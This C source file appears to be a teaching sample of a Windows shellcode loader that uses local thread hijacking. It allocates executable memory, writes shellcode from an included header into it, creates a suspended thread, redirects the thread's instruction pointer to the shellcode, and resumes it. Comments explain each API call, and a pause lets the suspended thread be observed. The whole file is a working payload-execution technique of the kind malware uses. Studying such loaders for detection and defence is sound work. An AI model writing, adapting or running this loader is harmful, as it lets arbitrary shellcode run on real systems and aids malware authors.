#include <windows.h>
#include <stdio.h>

void dummyFunction() {
    // This function does nothing and serves as a target for shellcode execution.
    
}

int main() {
    #include "../shellcode.h"

    // Allocate memory for the shellcode
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
    LPVOID VirtualAlloc(
        [in, optional] LPVOID lpAddress,
        [in]           SIZE_T dwSize,
        [in]           DWORD  flAllocationType,
        [in]           DWORD  flProtect
    );
    */
    LPVOID HandleMemory = VirtualAlloc(
        NULL,                       // No specific address because we don't mind where it is allocated 
        sizeof(shellcode),          // Size of the allocation we need (size of our shellcode)
        MEM_COMMIT | MEM_RESERVE,   // Allocate reserved and committed memory
        PAGE_EXECUTE_READWRITE      // Memory protection - we need to be able write the shellcode and execute it in this memory
    );
    
    // Check if the memory allocation was successful
    if (HandleMemory == NULL) {
        return -1;
    }
    printf("Memory allocated successfully at address: %p\n", HandleMemory);

    // Write the shellcode to the allocated memory
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    BOOL WriteProcessMemory(
        [in]  HANDLE  hProcess,
        [in]  LPVOID  lpBaseAddress,
        [in]  LPCVOID lpBuffer,
        [in]  SIZE_T  nSize,
        [out] SIZE_T  *lpNumberOfBytesWritten
    );
    */
    SIZE_T bytesWritten = 0;
    BOOL RESULT = WriteProcessMemory(
        GetCurrentProcess(),        // Handle to the target process (current process in this case)
        HandleMemory,               // Pointer to the base address in the target process where data will be written (our allocated memory)
        &shellcode,                 // Pointer to the buffer that contains the data to be written (our shellcode)
        sizeof(shellcode),          // Size of the data to be written (size of our shellcode)
        &bytesWritten               // Receives the number of bytes written
    );

    // Check if the WriteProcessMemory call was successful
    if (RESULT == 0 || bytesWritten != sizeof(shellcode)) {
        return -1;
    }
    printf("Wrote %zu bytes to allocated memory.\n", bytesWritten);

    // Create a new thread to execute the shellcode
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
    HANDLE CreateThread(
        [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
        [in]            SIZE_T                  dwStackSize,
        [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
        [in, optional]  __drv_aliasesMem LPVOID lpParameter,
        [in]            DWORD                   dwCreationFlags,
        [out, optional] LPDWORD                 lpThreadId
    );
    */
    DWORD threadId = 0;
    HANDLE hThread = CreateThread(
        NULL,                                       // Default security attributes
        0,                                          // Default stack size
        (LPTHREAD_START_ROUTINE)&dummyFunction,     // Pointer to the thread dummyfunction (start address) [Our shellcode will run after hijacking this thread]
        NULL,                                       // No arguments to the thread function
        CREATE_SUSPENDED,                           // Create the thread in a suspended state
        &threadId                                   // Receives the thread identifier
    );

    // Check if the thread was created successfully
    if (hThread == NULL) {
        return -1;
    }
    printf("Thread created successfully with ID: %lu\n", threadId);

    // Sleep for 15 seconds to allow observation of the created thread in a suspended state
    printf("Sleeping for 15 seconds before hijacking the thread...\n");
    Sleep(15 * 1000);

    // Hijack the created thread to execute our shellcode
    CONTEXT ctx = {0};               // Initialize a CONTEXT structure to hold the thread context
    ctx.ContextFlags = CONTEXT_ALL; // Specify that we want to retrieve all context information

    // Retrieve the context of the created thread
    GetThreadContext(hThread, &ctx);
    printf("Original RIP: 0x%p\n", (void*)ctx.Rip);

    // Modify the instruction pointer (RIP) to point to our shellcode
    ctx.Rip = (DWORD64)HandleMemory;
    printf("Modified RIP to point to shellcode at address: 0x%p\n", (void*)ctx.Rip);

    // Set the modified context back to the thread
    SetThreadContext(hThread, &ctx);

    // Resume the thread to start executing the shellcode
    ResumeThread(hThread);
    printf("Thread resumed to execute shellcode.\n");

    // Wait for the created thread to finish execution
    WaitForSingleObject(
        hThread,                      // Handle to the thread
        INFINITE                      // Wait indefinitely until the thread terminates
    );

    // Clean up: Close the thread handle and free the allocated memory
    CloseHandle(hThread);
    VirtualFree(HandleMemory, 0, MEM_RELEASE);

    return 0;
}